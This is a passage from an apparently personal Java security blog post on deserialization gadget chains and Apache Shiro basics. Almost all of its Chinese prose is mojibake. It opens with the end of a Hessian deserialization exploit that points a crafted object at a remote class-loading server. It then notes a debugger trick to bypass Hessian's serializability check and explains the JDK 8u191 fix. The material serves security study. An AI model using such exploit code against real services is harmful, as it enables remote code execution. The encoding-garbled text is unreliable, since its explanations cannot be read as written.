class_">HessianProxyFactory</span>();</span><br><span class="line">        <span class="type">HelloService</span> <span class="variable">hello</span> <span class="operator">=</span> (HelloService) factory.create(</span><br><span class="line">                HelloService.class, <span class="string">&quot;http://localhost:8080/hessian/hello&quot;</span>);</span><br><span class="line">        hello.setObject(getObject(<span class="string">&quot;http://127.0.0.1:9999/&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>ç”±äº <code>javax.naming.spi.ContinuationContext</code> æ²¡æœ‰å®ç° <code>java.io.Serializable</code> æ¥å£ï¼Œå› æ­¤éœ€è¦åœ¨ <code>com.caucho.hessian.io.SerializerFactory#getDefaultSerializer</code> ä¸‹æ–­ç‚¹è®¾ç½® <code>_isAllowNonSerializable</code> ä¸º <code>true</code> é€šè¿‡æ£€æŸ¥ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! Serializable.class.isAssignableFrom(cl)</span><br><span class="line">    &amp;&amp; ! _isAllowNonSerializable) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Serialized class &quot;</span> + cl.getName() + <span class="string">&quot; must implement java.io.Serializable&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h4 id="ä¿®å¤æƒ…å†µï¼ˆ-JDK8u191ï¼‰"><a href="#ä¿®å¤æƒ…å†µï¼ˆ-JDK8u191ï¼‰" class="headerlink" title="ä¿®å¤æƒ…å†µï¼ˆ&lt; JDK8u191ï¼‰"></a>ä¿®å¤æƒ…å†µï¼ˆ&lt; JDK8u191ï¼‰</h4><p>è¿™æ¡åˆ©ç”¨é“¾ä¸­çš„ <code>com.sun.naming.internal.VersionHelper12#loadClass</code> å’Œ JNDI-LDAP çš„è¿œç¨‹ç±»åŠ è½½æ˜¯åŒä¸€ä¸ªå‡½æ•°ï¼Œåœ¨ JDK-8u191 å¼€å§‹è¯¥å‡½æ•°å¢åŠ äº† <code>com.sun.jndi.ldap.object.trustURLCodebase</code> åˆ¤æ–­å¯¼è‡´è¿œç¨‹ç±»åŠ è½½å¤±æ•ˆã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> className å¿…å¡«ï¼Œç›®æ ‡ç±»çš„â€œå®Œå…¨é™å®šåâ€ï¼ˆFQCNï¼‰ï¼Œä¾‹å¦‚ &quot;com.example.EvilFactory&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> codebase  å¿…å¡«ï¼Œç©ºæ ¼åˆ†éš”çš„ä¸€ç»„ URL å­—ç¬¦ä¸²ï¼Œç”¨ä½œç±»åŠ è½½çš„æœç´¢è·¯å¾„</span></span><br><span class="line"><span class="comment"> *                  å…¸å‹æ¥æºæ˜¯ LDAP æ¡ç›®é‡Œçš„ &quot;javaCodeBase&quot;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»…å½“ç³»ç»Ÿå±æ€§ com.sun.jndi.ldap.object.trustURLCodebase è¢«è®¾ç½®ä¸º &quot;true&quot; æ—¶ï¼Œ</span></span><br><span class="line">    <span class="comment">// æ‰å…è®¸ä»ä»»æ„ URL codebase ä¸‹è½½å¹¶åŠ è½½ç±»ï¼ˆ8u191+ é»˜è®¤æ˜¯ falseï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equalsIgnoreCase(trustURLCodebase)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»¥â€œçº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨â€ä½œä¸ºçˆ¶åŠ è½½å™¨ï¼ˆTCCLï¼šå½“å‰çº¿ç¨‹å…³è”çš„ ClassLoaderï¼‰</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> getContextClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åŸºäº codebase æ„é€ ä¸€ä¸ª URLClassLoader</span></span><br><span class="line">        <span class="comment">// æ³¨ï¼šgetUrlArray(codebase) ä¼šæŠŠç”¨ç©ºæ ¼åˆ†éš”çš„å¤šä¸ª URL è§£ææˆ URL[]</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span></span><br><span class="line">                URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨ä¸Šé¢è¿™ä¸ªå«è¿œç¨‹ URL çš„ ClassLoader å»åŠ è½½ç›®æ ‡ç±»</span></span><br><span class="line">        <span class="comment">// è¿™ä¸ªé‡è½½é€šå¸¸ä¼šè°ƒç”¨ Class.forName(className, false, cl) æˆ–ç­‰ä»·é€»è¾‘</span></span><br><span class="line">        <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// æœªå¼€å¯ä¿¡ä»»è¿œç¨‹ codebaseï¼šè¿™é‡Œç›´æ¥è¿”å› nullï¼Œè¡¨ç¤ºâ€œä¸è¦åšè¿œç¨‹åŠ è½½â€</span></span><br><span class="line">        <span class="comment">// ä¸Šå±‚è°ƒç”¨æ–¹æ®æ­¤ä¼šæ”¹èµ°å…¶å®ƒè·¯å¾„ï¼ˆä¾‹å¦‚å°è¯•ä»æœ¬åœ° classpath æ‰¾å·¥å‚ç±»ï¼Œ</span></span><br><span class="line">        <span class="comment">// æˆ–æ”¾å¼ƒ Reference åˆ†æ”¯å¹¶è¿”å›/æŠ›é”™ï¼‰</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ååºåˆ—åŒ–å¼‚å¸¸"><a href="#ååºåˆ—åŒ–å¼‚å¸¸" class="headerlink" title="ååºåˆ—åŒ–å¼‚å¸¸"></a>ååºåˆ—åŒ–å¼‚å¸¸</h2><p><code>com.caucho.hessian.io.Hessian2Input#readObject</code> å‡½æ•°</p>
<h1 id="Kryo"><a href="#Kryo" class="headerlink" title="Kryo"></a>Kryo</h1><h1 id="Dubbo"><a href="#Dubbo" class="headerlink" title="Dubbo"></a>Dubbo</h1><h1 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h1><p><strong>Apache Shiro</strong> æ˜¯ä¸€ä¸ªé€šç”¨çš„ Java å®‰å…¨æ¡†æ¶ï¼Œè´Ÿè´£å››ä»¶äº‹ï¼š<strong>èº«ä»½è®¤è¯ï¼ˆAuthenticationï¼‰</strong>ã€<strong>è®¿é—®æ§åˆ¶&#x2F;æˆæƒï¼ˆAuthorizationï¼‰</strong>ã€<strong>ä¼šè¯ç®¡ç†ï¼ˆSession Managementï¼‰</strong>ã€<strong>åŠ è§£å¯†ï¼ˆCryptographyï¼‰</strong>ã€‚</p>
<blockquote>
<ul>
<li><strong>Authentication èº«ä»½è®¤è¯</strong>ï¼šç¡®è®¤â€œä½ æ˜¯è°â€ã€‚ç”¨åˆ°ä¸‹é¢ä¸‰ä¸ªä¿¡æ¯ï¼š<ul>
<li><strong>Subject</strong>ï¼šä¸»ä½“&#x2F;å½“äº‹äººã€‚å‘èµ·æ“ä½œçš„äººæˆ–ç¨‹åºçº¿ç¨‹ã€‚</li>
<li><strong>Principal</strong>ï¼šèº«ä»½æ ‡è¯†ï¼Œè¦æ±‚<strong>å”¯ä¸€</strong>ï¼ˆå¦‚ç”¨æˆ·å&#x2F;æ‰‹æœºå·&#x2F;é‚®ç®±&#x2F;ç”¨æˆ·IDï¼‰ã€‚</li>
<li><strong>Credential</strong>ï¼šå‡­è¯ï¼Œç”¨æ¥è¯æ˜ä½ æ˜¯è¿™ä¸ªèº«ä»½ï¼ˆå¦‚å¯†ç ã€TOTPã€è¯ä¹¦ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>Authorization è®¿é—®æ§åˆ¶</strong>ï¼šç¡®è®¤â€œä½ èƒ½åšä»€ä¹ˆâ€ã€‚ä¸‰è¦ç´ ï¼š<ul>
<li><strong>who</strong>ï¼ˆè°ï¼‰â†’ user&#x2F;subjectï¼Œå½“å‰æ“ä½œäºº</li>
<li><strong>what</strong>ï¼ˆå¯¹ä»€ä¹ˆï¼‰â†’ resourceï¼Œè¢«è®¿é—®çš„èµ„æºï¼ˆæ¥å£ã€èœå•ã€è®°å½•ç­‰ï¼‰</li>
<li><strong>how</strong>ï¼ˆæ€ä¹ˆæ“ä½œï¼‰â†’ permissionï¼ˆæ“ä½œè®¸å¯ï¼‰ï¼Œé€šå¸¸ä¹Ÿä¼šé€šè¿‡ <strong>roleï¼ˆè§’è‰²ï¼‰</strong> æ¥æ‰“åŒ…ä¸€ç»„æƒé™<ul>
<li><strong>permission</strong>ï¼šæœ€å°ç²’åº¦çš„æ“ä½œè®¸å¯ï¼ˆShiro å¸¸ç”¨<strong>é€šé…æƒé™</strong>æ¨¡å‹ï¼‰</li>
<li><strong>role</strong>ï¼šè§’è‰²ï¼ˆæƒé™çš„<strong>é›†åˆ</strong>ï¼Œå¦‚ <code>admin</code>ã€<code>editor</code>ï¼‰</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<p>å®ƒæ—¢èƒ½ç”¨äº Webï¼ˆæ‹¦æˆªè¯·æ±‚ã€ç™»å½•ã€é‰´æƒï¼‰ï¼Œä¹Ÿèƒ½ç”¨äºé Web ç¨‹åºï¼ˆå‘½ä»¤è¡Œå·¥å…·ã€åå°ä»»åŠ¡ï¼‰ï¼Œå› ä¸ºå®ƒä¸ä¾èµ– Servlet å®¹å™¨è‡ªå¸¦çš„ Sessionã€‚</p>
<h2 id="Shiro-å…³é”®ç»„ä»¶"><a href="#Shiro-å…³é”®ç»„ä»¶" class="headerlink" title="Shiro å…³é”®ç»„ä»¶"></a>Shiro å…³é”®ç»„ä»¶</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/21/Java%20%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6/images/ShiroArchitecture.png"
                      alt="Apache Shiro Architecture"
                ></p>
<h3 id="Subject"><a href="#Subject" class="headerlink" title="Subject"></a>Subject</h3><p>ä»£è¡¨â€œå½“å‰ä¸»ä½“â€ã€‚ä½ åœ¨ä¸šåŠ¡ä»£ç é‡Œå‡ ä¹åªå’Œå®ƒæ‰“äº¤é“ï¼š</p>
<ul>
<li><code>Subject.login(token)</code>ï¼šç™»å½•</li>
<li><code>Subject.isAuthenticated()</code>ï¼šæ˜¯å¦å·²è®¤è¯</li>
<li><code>Subject.hasRole(&quot;admin&quot;)</code> &#x2F; <code>checkRole(...)</code>ï¼šè§’è‰²åˆ¤æ–­</li>
<li><code>Subject.isPermitted(&quot;doc:read:123&quot;)</code> &#x2F; <code>checkPermission(...)</code>ï¼šæƒé™åˆ¤æ–­</li>
<li><code>Subject.getPrincipal()</code>ï¼šå–å‡ºå½“å‰ç”¨æˆ·æ ‡è¯†</li>
<li><code>Subject.getSession()</code>ï¼šæ‹¿ä¼šè¯ï¼ˆæ— è®ºæ˜¯å¦ Webï¼‰</li>
</ul>
<h3 id="SecurityManagerï¼ˆå®‰å…¨ç®¡ç†å™¨ï¼‰"><a href="#SecurityManagerï¼ˆå®‰å…¨ç®¡ç†å™¨ï¼‰" class="headerlink" title="SecurityManagerï¼ˆå®‰å…¨ç®¡ç†å™¨ï¼‰"></a>SecurityManagerï¼ˆå®‰å…¨ç®¡ç†å™¨ï¼‰</h3><p><strong>Shiro çš„æ ¸å¿ƒæ¢çº½</strong>ï¼ŒæŠŠå…·ä½“å·¥ä½œåˆ†æ´¾ç»™ä¸‹å±æ¨¡å—ï¼šAuthenticator &#x2F; Authorizer &#x2F; SessionManager &#x2F; â€¦<br>åœ¨ Spring ç¯å¢ƒä¸­ï¼Œå®ƒå¾€å¾€æ˜¯ä¸€ä¸ªå•ä¾‹ Beanï¼ˆ<code>DefaultSecurityManager</code> æˆ– <code>DefaultWebSecurityManager</code>ï¼‰ã€‚</p>
<h4 id="Authenticatorï¼ˆè®¤è¯å™¨ï¼‰"><a href="#Authenticatorï¼ˆè®¤è¯å™¨ï¼‰" class="headerlink" title="Authenticatorï¼ˆè®¤è¯å™¨ï¼‰"></a>Authenticatorï¼ˆè®¤è¯å™¨ï¼‰</h4><p>è´Ÿè´£è°ƒç”¨<strong>ä¸€ä¸ªæˆ–å¤šä¸ª Realm</strong> å®Œæˆè®¤è¯ã€‚å¤š Realm æ—¶å¯é…ç½®ç­–ç•¥ï¼š</p>
<ul>
<li><code>AtLeastOneSuccessfulStrategy</code>ï¼ˆé»˜è®¤ï¼Œæœ‰ä¸€ä¸ªæˆåŠŸå³å¯ï¼‰</li>
<li><code>FirstSuccessfulStrategy</code>ï¼ˆç¬¬ä¸€ä¸ªæˆåŠŸçš„ä¸ºå‡†ï¼‰</li>
<li><code>AllSuccessfulStrategy</code>ï¼ˆå…¨éƒ¨æˆåŠŸæ‰ç®—é€šè¿‡ï¼‰</li>
</ul>
<h4 id="Authorizerï¼ˆæˆæƒå™¨ï¼‰"><a href="#Authorizerï¼ˆæˆæƒå™¨ï¼‰" class="headerlink" title="Authorizerï¼ˆæˆæƒå™¨ï¼‰"></a>Authorizerï¼ˆæˆæƒå™¨ï¼‰</h4><p>æ ¹æ®è§’è‰²&#x2F;æƒé™åˆ¤å®šæ˜¯å¦å…è®¸è®¿é—®ã€‚é»˜è®¤å®ç°åŸºäº <strong>WildcardPermission</strong> å¤„ç†ä½ å®šä¹‰çš„é€šé…æƒé™å­—ç¬¦ä¸²ã€‚</p>
<h4 id="Realmï¼ˆæ•°æ®æº-è®¤è¯-æˆæƒå®ç°ï¼‰"><a href="#Realmï¼ˆæ•°æ®æº-è®¤è¯-æˆæƒå®ç°ï¼‰" class="headerlink" title="Realmï¼ˆæ•°æ®æº + è®¤è¯&#x2F;æˆæƒå®ç°ï¼‰"></a>Realmï¼ˆæ•°æ®æº + è®¤è¯&#x2F;æˆæƒå®ç°ï¼‰</h4><p>Realm æ˜¯â€œæ¡¥â€ï¼ŒæŠŠä½ çš„<strong>å­˜å‚¨ç³»ç»Ÿ</strong>ï¼ˆæ•°æ®åº“&#x2F;LDAP&#x2F;è¿œç¨‹æœåŠ¡ï¼‰é‡Œçš„ç”¨æˆ·ã€è§’è‰²ã€æƒé™æ•°æ®æä¾›ç»™ Shiroã€‚<br>å…¸å‹åšæ³•ï¼šè‡ªå®šä¹‰ä¸€ä¸ª <code>AuthorizingRealm</code>ï¼Œé‡å†™ä¸¤ä»¶äº‹ï¼š</p>
<ul>
<li><code>doGetAuthenticationInfo(token)</code>ï¼šæ ¹æ®ç”¨æˆ·åæŸ¥å‡º<strong>å“ˆå¸Œåçš„å¯†ç  + ç›</strong>ï¼Œè¿”å› <code>AuthenticationInfo</code>ã€‚</li>
<li><code>doGetAuthorizationInfo(principals)</code>ï¼šæŸ¥å‡ºè¯¥ç”¨æˆ·çš„è§’è‰²ä¸æƒé™ï¼Œå°è£… <code>AuthorizationInfo</code>ã€‚</li>
</ul>
<blockquote>
<p><strong>CredentialsMatcher</strong>ï¼šå£ä»¤æ ¡éªŒå™¨ã€‚å¸¸ç”¨ <code>HashedCredentialsMatcher</code> åš SHA-256&#x2F;SHA-512 + ç› + å¤šè½®è¿­ä»£ã€‚è‹¥éœ€ bcrypt&#x2F;argon2ï¼Œå¯è‡ªå®šä¹‰æˆ–ç”¨ç¤¾åŒºæ‰©å±•ã€‚</p>
</blockquote>
<h4 id="SessionManager-SessionDAO"><a href="#SessionManager-SessionDAO" class="headerlink" title="SessionManager &#x2F; SessionDAO"></a>SessionManager &#x2F; SessionDAO</h4><p>Shiro è‡ªå¸¦ä¸€å¥—<strong>ä¸ Servlet æ— å…³</strong>çš„ä¼šè¯ç®¡ç†ï¼š</p>
<ul>
<li><strong>SessionManager</strong>ï¼šæ§åˆ¶ä¼šè¯ç”Ÿå‘½å‘¨æœŸ&#x2F;è¶…æ—¶ã€‚</li>
<li><strong>SessionDAO</strong>ï¼šä¼šè¯å­˜å‚¨æŠ½è±¡ã€‚å¯è½åˆ°å†…å­˜ã€æ•°æ®åº“ã€Redis ç­‰ï¼ˆéœ€è¦ç›¸åº”å®ç°ï¼Œå¦‚ç¤¾åŒºå¸¸ç”¨ shiro-redisï¼‰ã€‚</li>
</ul>
<p>å¸¸è§å®ç°ï¼š</p>
<ul>
<li><code>DefaultWebSessionManager</code>ï¼šWeb ç¯å¢ƒä¸‹çš„åŸç”Ÿ Shiro ä¼šè¯ï¼ˆCookie åå¸¸è§ <code>JSESSIONID</code> æˆ–è‡ªå®šä¹‰ï¼‰ã€‚</li>
<li><code>ServletContainerSessionManager</code>ï¼šç›´æ¥å¤ç”¨å®¹å™¨ä¼šè¯ã€‚</li>
<li>å¯ä»¥æ·»åŠ  <code>SessionListener</code> ç›‘å¬åˆ›å»º&#x2F;åœç”¨äº‹ä»¶ã€‚</li>
</ul>
<h4 id="CacheManagerï¼ˆç¼“å­˜ï¼‰"><a href="#CacheManagerï¼ˆç¼“å­˜ï¼‰" class="headerlink" title="CacheManagerï¼ˆç¼“å­˜ï¼‰"></a>CacheManagerï¼ˆç¼“å­˜ï¼‰</h4><p>ç»™<strong>æˆæƒä¿¡æ¯&#x2F;ä¼šè¯</strong>ç­‰åšç¼“å­˜ï¼Œå‡å°‘æ•°æ®åº“å‹åŠ›ã€‚å¸¸è§ï¼š</p>
<ul>
<li>Ehcacheã€Caffeineã€æœ¬åœ° Map æˆ– Redis é›†æˆ</li>
<li>å…¸å‹ç”¨æ³•ï¼š<strong>æˆæƒä¿¡æ¯ç¼“å­˜</strong>ï¼ˆ<code>AuthorizationInfo</code>ï¼‰èƒ½æ˜æ˜¾å‡å°‘â€œæ¯æ¬¡é‰´æƒéƒ½æŸ¥åº“â€çš„å¼€é”€</li>
</ul>
<h3 id="Cryptographyï¼ˆå¯†ç å­¦å·¥å…·ï¼‰"><a href="#Cryptographyï¼ˆå¯†ç å­¦å·¥å…·ï¼‰" class="headerlink" title="Cryptographyï¼ˆå¯†ç å­¦å·¥å…·ï¼‰"></a>Cryptographyï¼ˆå¯†ç å­¦å·¥å…·ï¼‰</h3><p>Shiro æä¾›å¸¸ç”¨ç»„ä»¶ï¼š</p>
<ul>
<li><code>SimpleHash</code>ã€<code>DefaultPasswordService</code> ç­‰æ•£åˆ—&#x2F;å¯†ç æœåŠ¡</li>
<li><code>AesCipherService</code> ç­‰å¯¹ç§°åŠ è§£å¯†</li>
<li><code>SecureRandomNumberGenerator</code> ç”Ÿæˆéšæœºç›</li>
</ul>
<p>ç”¨é€”ï¼š<strong>å®‰å…¨å­˜å‚¨å¯†ç ã€ç­¾å‘&#x2F;æ ¡éªŒ RememberMe Cookieã€å¯¹æ•æ„Ÿæ•°æ®åšåŠ è§£å¯†</strong>ã€‚</p>
<h2 id="åŸºæœ¬ä½¿ç”¨-3"><a href="#åŸºæœ¬ä½¿ç”¨-3" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h2><div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>


		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Java å¸¸è§ç»„ä»¶</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-10-21 22:46:30</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-10-28 12:49:53
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/10/21/Java å¸¸è§ç»„ä»¶/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/java-web/">#java web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/10/21/Java%20JDBC%20attack/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java JDBC attack</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/10/02/Java%20%E5%86%85%E5%AD%98%E9%A9%AC/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java å†…å­˜é©¬</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Java å¸¸è§ç»„ä»¶</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Commons-Collections"><span class="nav-text">Commons Collections</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Transformer"><span class="nav-text">Transformer</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8-transform-%E6%96%B9%E6%B3%95%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="nav-text">è°ƒç”¨ transform æ–¹æ³•çš„å¯¹è±¡</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#TransformedMap"><span class="nav-text">TransformedMap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LazyMap"><span class="nav-text">LazyMap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TransformingComparator"><span class="nav-text">TransformingComparator</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Transformer-%E7%9A%84%E6%8E%A5%E5%8F%A3%E5%AE%9E%E7%8E%B0%E7%B1%BB"><span class="nav-text">Transformer çš„æ¥å£å®ç°ç±»</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ConstantTransformer"><span class="nav-text">ConstantTransformer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#InvokerTransformer"><span class="nav-text">InvokerTransformer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#InstantiateTransformer"><span class="nav-text">InstantiateTransformer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ChainedTransformer"><span class="nav-text">ChainedTransformer</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Transformer-%E6%9E%84%E9%80%A0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="nav-text">Transformer æ„é€ ä»£ç æ‰§è¡Œæµ</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">æ„é€ ä»»æ„ä»£ç æ‰§è¡Œ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A0%E8%BD%BD"><span class="nav-text">æ„é€ ä»»æ„å­—èŠ‚ç åŠ è½½</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Transformer-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BF%AE%E5%A4%8D"><span class="nav-text">Transformer ååºåˆ—åŒ–ä¿®å¤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">ååºåˆ—åŒ–åˆ©ç”¨é“¾</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CC0"><span class="nav-text">CC0</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" 